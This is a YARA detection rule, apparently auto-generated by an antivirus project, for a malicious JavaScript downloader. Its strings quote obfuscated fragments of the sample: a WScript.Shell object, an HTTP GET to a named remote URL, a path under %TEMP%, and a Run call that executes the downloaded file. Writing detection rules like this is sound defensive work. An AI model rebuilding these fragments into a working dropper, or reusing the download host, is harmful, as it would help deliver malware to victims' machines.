rule sig_20160427_12cdf88cc70a7fee9ef000554f355cf3 {
  meta:
    description = "datamaliciousorder - file 20160427_12cdf88cc70a7fee9ef000554f355cf3.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "2b6bb3b60f59e0c35101cb21c39741c7f1e9fd108610fb0abe7bdabe2ff4e2c6"

  strings:
    $s1  = "HvbkrSxejo[FtmqwOxhei](\"G\" + \"ET\", \"http://soccerinsider.net/mys3ks\", false);" fullword ascii
    $s2  = "function KnpdpJplfl() {return VvstwAkebw[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"tNbDQlL" ascii
    $s3  = "function KnpdpJplfl() {return VvstwAkebw[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"tNbDQlL" ascii
    $s4  = "function LogmuFfrpn() {return ((AmojwBjhsk == true) && (AmojwBjhsk == GbdipBzgue)) ? 1 : UoieyMkcxx;};" fullword ascii
    $s5  = "function JeydpNxpec(UjxbuOxmmw, YkzikQyioc){UoieyMkcxx = UoieyMkcxx * 1; return UjxbuOxmmw - YkzikQyioc;};" fullword ascii
    $s6  = "var VvstwAkebw = function UxmauJdypc() {return SodbjFcvco[ZntusYihqm](\"WScript\"+\".Shell\");}(), UvjkcKrgfh = 11;" fullword ascii
    $s7  = "var SodbjFcvco = this[\"WScript\"];" fullword ascii
    $s8  = "function SmjbxGwsli(){return MgnycSkjni + \"\";};" fullword ascii
    $s9  = "if (HvbkrSxejo[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s10 = "function AeqnhAnkjd(DetkgAsdli){VvstwAkebw[\"R\"+\"un\"](DetkgAsdli, UoieyMkcxx, UoieyMkcxx);};" fullword ascii
    $s11 = "GbdipBzgue = true; " fullword ascii
    $s12 = "var UskslGgguk = false;" fullword ascii
    $s13 = "UskslGgguk = true;" fullword ascii
    $s14 = "var AmojwBjhsk = false;" fullword ascii
    $s15 = "var NosleStujy = new this[\"D\"+\"ate\"]();" fullword ascii
    $s16 = "return JeydpNxpec(YhmgvTashz, GgehrXxhog);" fullword ascii
    $s17 = "function YwtgcIgfke(){return ZntusYihqm;};" fullword ascii
    $s18 = "AmojwBjhsk = true; " fullword ascii
    $s19 = "}while (DrvtlKsqrv);" fullword ascii
    $s20 = "function MuwldSjitw(EhjqqYsezl) {var UdiiaJyrgq = (1, 2, 3, 4, 5, EhjqqYsezl); return UdiiaJyrgq;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}